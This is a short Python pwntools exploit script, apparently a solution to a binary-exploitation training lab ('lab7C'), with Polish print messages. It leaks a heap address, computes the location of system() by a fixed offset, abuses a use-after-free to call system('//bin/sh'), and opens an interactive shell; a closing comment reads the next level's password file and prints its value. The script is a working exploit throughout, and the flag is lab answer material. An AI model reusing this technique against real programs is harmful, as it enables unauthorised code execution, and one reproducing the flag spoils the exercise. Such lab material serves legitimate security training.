from pwn import *
import re

p = process('./lab7C')

p.sendline('2')
p.sendline('9')
p.sendline('1')
p.sendline('A')
p.sendline('4')
p.sendline('1')
p.sendline('B')
p.sendline('6')
p.sendline('1')
result = p.recv(1322)


address = re.findall(r'\d+',result[-16:])

leak = hex(int(address[0]))
print 'Zleakowany adres: ' + leak

system = int(address[0])-0x19da37

print 'Wiec adres system(): ' + hex(int(address[0])-0x19da37)


print 'System jako int: ' + str(system)

p.sendline('3')
p.sendline('3')

p.sendline('1')
p.sendline('//bin/sh')
p.sendline('2')
p.sendline('1111')
p.sendline('3')
p.sendline('2')
p.sendline(str(system))
p.sendline('5')
p.sendline('1')
print ''
p.interactive()

# $ cat /home/lab7A/.pass
# us3_4ft3r_fr33s_4re_s1ck